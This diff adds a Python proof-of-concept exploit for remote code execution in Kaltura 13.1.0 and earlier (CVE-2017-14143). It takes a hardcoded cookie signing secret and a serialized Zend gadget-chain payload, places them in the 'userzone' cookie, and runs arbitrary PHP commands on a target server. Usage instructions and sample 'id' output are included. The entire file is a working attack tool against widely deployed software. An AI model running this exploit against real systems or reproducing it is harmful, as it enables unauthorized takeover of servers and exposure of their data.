@@ -1,0 +1,59 @@
+#!/usr/bin/env python
+
+# Kaltura <= 13.1.0 RCE (CVE-2017-14143)
+# https://telekomsecurity.github.io/2017/09/kaltura-rce.html
+# 
+# $ python kaltura_rce.py "https://example.com" 0_xxxxxxxx "system('id')"
+# [~] host: https://example.com
+# [~] entry_id: 0_xxxxxxxx
+# [~] code: system('id')
+# [+] sending request..
+# uid=1003(wwwrun) gid=50004(www) groups=50004(www),7373(kaltura)
+
+import urllib
+import urllib2
+import base64
+import md5
+import sys
+
+cookie_secret = 'y3tAno3therS$cr3T';
+
+def exploit(host, entry_id, php_code):
+    print("[+] Sending request..")
+    url = "{}/index.php/keditorservices/getAllEntries?list_type=15&entry_id={}".format(host, entry_id)
+
+    cmd = "{}.die();".format(php_code)
+    cmd_len = len(cmd)
+
+    payload = "a:1:{s:1:\"z\";O:8:\"Zend_Log\":1:{s:11:\"\0*\0_writers\";a:1:{i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"\0*\0_eventsToMail\";a:1:{i:0;i:1;}s:22:\"\0*\0_layoutEventsToMail\";a:0:{}s:8:\"\0*\0_mail\";O:9:\"Zend_Mail\":0:{}s:10:\"\0*\0_layout\";O:11:\"Zend_Layout\":3:{s:13:\"\0*\0_inflector\";O:23:\"Zend_Filter_PregReplace\":2:{s:16:\"\0*\0_matchPattern\";s:7:\"/(.*)/e\";s:15:\"\0*\0_replacement\";s:%s:\"%s\";}s:20:\"\0*\0_inflectorEnabled\";b:1;s:10:\"\0*\0_layout\";s:6:\"layout\";}s:22:\"\0*\0_subjectPrependText\";N;}}};}"
+
+    exploit_code = payload % (len(cmd), cmd)
+    encoded = base64.b64encode(exploit_code)
+    md5_hash = md5.new("%s%s" % (encoded, cookie_secret)).hexdigest()
+
+    cookies={'userzone': "%s%s" % (encoded, md5_hash)}
+
+    r = urllib2.Request(url)
+    r.add_header('Cookie', urllib.urlencode(cookies))
+
+    req = urllib2.urlopen(r)
+    return req.read()
+
+if __name__ == '__main__':
+
+    if len(sys.argv) < 4:
+        print("Usage: %s <host> <entry_id> <php_code>" % sys.argv[0])
+        print(" example: %s http://example.com 0_abc1234 system('id')" % sys.argv[0])
+        sys.exit(0)
+
+    host = sys.argv[1]
+    entry_id = sys.argv[2]
+    cmd = sys.argv[3]
+
+    print("[~] host: %s" % host)
+    print("[~] entry_id: %s" % entry_id)
+    print("[~] php_code: %s" % cmd)
+
+    result = exploit(sys.argv[1], sys.argv[2], sys.argv[3])
+
+    print(result)
